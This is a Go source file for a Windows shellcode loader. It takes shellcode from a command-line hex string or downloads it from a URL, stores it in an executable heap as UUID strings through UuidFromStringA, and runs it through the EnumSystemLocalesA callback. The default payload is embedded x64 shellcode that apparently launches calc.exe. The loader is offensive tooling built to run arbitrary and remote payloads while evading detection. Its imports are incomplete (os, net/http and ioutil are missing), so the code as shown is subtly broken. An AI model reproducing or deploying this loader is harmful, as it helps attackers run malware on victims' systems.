


package main

import (
	// Standard
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"

	
	"github.com/google/uuid"
)

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	shellcodePath := flag.String("shellcode", "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500", "Path to the shellcode file")
    shellcodeURL := flag.String("shellcode-url", "", "URL of the shellcode file")

	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()
	var shellcodeHex string 
	var err error
	if *shellcodeURL == "" {

		if *shellcodePath == "" {
			
			log.Fatal("Please provide either the URL or the path to the shellcode file")
		}
		shellcodeBytes := *shellcodePath
		
		_, err = hex.DecodeString(string(shellcodeBytes))
		if err == nil {
			
			shellcodeHex = shellcodeBytes
		} else {
		
			shellcodeHex = hex.EncodeToString([]byte(shellcodeBytes))
		}
		
	} else {
		
		resp, err := http.Get(*shellcodeURL)
		if err != nil {
			log.Fatalf("Error fetching shellcode from URL: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			log.Fatalf("Failed to fetch shellcode from URL: %s", resp.Status)
		}

		shellcodeBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("Error reading shellcode from response body: %v", err)
		}

		
		_, err = hex.DecodeString(string(shellcodeBytes))
		if err == nil {
			
			shellcodeHex = string(shellcodeBytes)
		} else {
		
			shellcodeHex = hex.EncodeToString(shellcodeBytes)
		}
	

		
	}


	if *debug {
		fmt.Println("[DEBUG]Loaded shellcode from file:", *shellcodePath)
	}

	shellcode, errShellcode := hex.DecodeString(shellcodeHex)
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	


	
	if *debug {
		fmt.Println("[DEBUG]Converting shellcode to slice of UUIDs")
	}

	uuids, err := shellcodeToUUID(shellcode)
	if err != nil {
		log.Fatal(err.Error())
	}

	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll & Rpcrt4.dll")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32")
	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading HeapCreate, HeapAlloc, EnumSystemLocalesA, and UuidToStringA procedures")
	}
	heapCreate := kernel32.NewProc("HeapCreate")
	heapAlloc := kernel32.NewProc("HeapAlloc")
	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
	uuidFromString := rpcrt4.NewProc("UuidFromStringA")


	
	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
	if heapAddr == 0 {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))

	}

	if *verbose {
		fmt.Println(fmt.Sprintf("Heap created at: 0x%x", heapAddr))
	}

	/*	https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
		DECLSPEC_ALLOCATOR LPVOID HeapAlloc(
		HANDLE hHeap,
		DWORD  dwFlags,
		SIZE_T dwBytes
		);
	*/

	// Allocate the heap
	addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
	if addr == 0 {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapAlloc function:\r\n%s", err))
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("Heap allocated: 0x%x", addr))
	}

	if *debug {
		fmt.Println("[DEBUG]Iterating over UUIDs and calling UuidFromStringA...")
	}

	/*
		RPC_STATUS UuidFromStringA(
		RPC_CSTR StringUuid,
		UUID     *Uuid
		);
	*/

	addrPtr := addr
	for _, uuid := range uuids {
		// Must be a RPC_CSTR which is null terminated
		u := append([]byte(uuid), 0)

		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
		rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)

		// RPC_S_OK = 0
		if rpcStatus != 0 {
			log.Fatal(fmt.Sprintf("There was an error calling UuidFromStringA:\r\n%s", err))
		}

		addrPtr += 16
	}
	if *verbose {
		fmt.Println("Completed loading UUIDs to memory with UuidFromStringA")
	}

	/*
		BOOL EnumSystemLocalesA(
		LOCALE_ENUMPROCA lpLocaleEnumProc,
		DWORD            dwFlags
		);
	*/

	// Execute Shellcode
	if *debug {
		fmt.Println("[DEBUG]Calling EnumSystemLocalesA to execute shellcode")
	}
	ret, _, err := enumSystemLocalesA.Call(addr, 0)
	if ret == 0 {
		log.Fatal(fmt.Sprintf("EnumSystemLocalesA GetLastError: %s", err))
	}
	if *verbose {
		fmt.Println("Executed shellcode")
	}

}

// shellcodeToUUID takes in shellcode bytes, pads it to 16 bytes, breaks them into 16 byte chunks (size of a UUID),
// converts the first 8 bytes into Little Endian format, creates a UUID from the bytes, and returns an array of UUIDs
func shellcodeToUUID(shellcode []byte) ([]string, error) {

	// Pad shellcode to 16 bytes, the size of a UUID
	if 16-len(shellcode)%16 < 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
		shellcode = append(shellcode, pad...)
	}

	var uuids []string

	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte

		// This seems unecessary or overcomplicated way to do this

		// Add first 4 bytes
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		// Add remaining
		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)

		u, err := uuid.FromBytes(uuidBytes)
		if err != nil {
			return nil, fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
		}

		uuids = append(uuids, u.String())
	}
	return uuids, nil
}

// export GOOS=windows GOARCH=amd64;go build -o UuidFromString.exe cmd/UuidFromString/main.go